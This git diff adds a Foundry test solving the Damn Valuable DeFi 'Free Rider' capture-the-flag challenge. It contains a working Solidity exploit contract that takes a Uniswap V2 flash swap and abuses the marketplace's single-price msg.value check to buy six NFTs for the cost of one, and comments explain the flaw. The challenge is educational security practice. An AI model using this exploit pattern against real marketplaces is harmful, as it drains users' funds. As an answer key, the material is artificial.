@@ -11,6 +11,120 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+//note(tina): added
+import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+
+
+
+contract flashLoanUser is IUniswapV2Callee, IERC721Receiver {
+
+FreeRiderNFTMarketplace public immutable marketplace;
+FreeRiderRecoveryManager public immutable recoveryManager;
+DamnValuableNFT public immutable nft;
+IUniswapV2Pair public immutable pair;
+address public immutable token;
+address public immutable weth;
+address public immutable player;
+
+constructor(
+    address _marketplace, 
+    address _recoveryManager,
+    address _nft,
+    address _pair, 
+    address _token, 
+    address _weth,
+    address _player
+) {
+    marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
+    recoveryManager = FreeRiderRecoveryManager(payable(_recoveryManager));
+    nft = DamnValuableNFT(_nft);
+    pair = IUniswapV2Pair(_pair);
+    token = _token;
+    weth = _weth;   
+    player = _player;
+}
+
+receive() external payable {}
+
+function flashLoanInitilizer(uint256 amount) external {
+    //determine the right token to borrow
+    address token0 = pair.token0();
+    address token1 = pair.token1();
+    
+    uint256 amount0Out = 0;
+    uint256 amount1Out = 0;
+    
+    if (token0 == address(weth)) {
+        amount0Out = amount; 
+    } else {
+        amount1Out = amount; 
+    }
+    
+    //call swap and activate flashloan
+    pair.swap(amount0Out, amount1Out, address(this), abi.encode(amount));
+}
+
+//called by pair contract
+function uniswapV2Call(
+    address sender,
+    uint256 amount0,
+    uint256 amount1,
+    bytes calldata data
+) external override {
+    //security best practice
+    require(msg.sender == address(pair), "Invalid caller");
+    
+    uint256 wethBorrowed = abi.decode(data, (uint256));
+    
+    //Convert WETH to ETH to buy NFTs
+    WETH(payable(weth)).withdraw(wethBorrowed);
+   
+   
+    uint256[] memory tokenIds = new uint256[](6);
+    for (uint256 i = 0; i < 6; i++) {
+        tokenIds[i] = i;
+    }
+    
+    marketplace.buyMany{value: 15 ether}(tokenIds);
+    
+
+    
+    for (uint256 i = 0; i < 6; i++) {
+        nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
+    }
+    
+    //convert to WETH to repay flashloan
+    uint256 ethBalance = address(this).balance;
+    WETH(payable(weth)).deposit{value: ethBalance}();
+    
+    
+    uint256 amountToRepay = ((wethBorrowed * 1000) / 997) + 1;
+    
+    IERC20(weth).transfer(address(pair), amountToRepay);
+
+    uint256 remainingWETH = IERC20(weth).balanceOf(address(this));
+    
+    if (remainingWETH > 0) {
+        WETH(payable(weth)).withdraw(remainingWETH); 
+        payable(player).transfer(address(this).balance); //Send all ETH to player
+    }
+}
+  
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
+
+
+
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,6 +237,21 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
+
+        flashLoanUser attacker = new flashLoanUser(
+            address(marketplace),
+            address(recoveryManager),
+            address(nft),
+            address(uniswapPair), 
+            address(token), 
+            address(weth),
+            address(player)
+        );
+        //call flashLoanInitilizer to get flashloan 15 ETH (only need price of one NFT due to exploit)
+        attacker.flashLoanInitilizer(15 ether);
+
+        //this is why the exploit works: the marketplace contract only check if msg.value is enough for one NFT, not all NFTs
+        //and transfer ETH to the buyer instead of the seller
         
     }
 
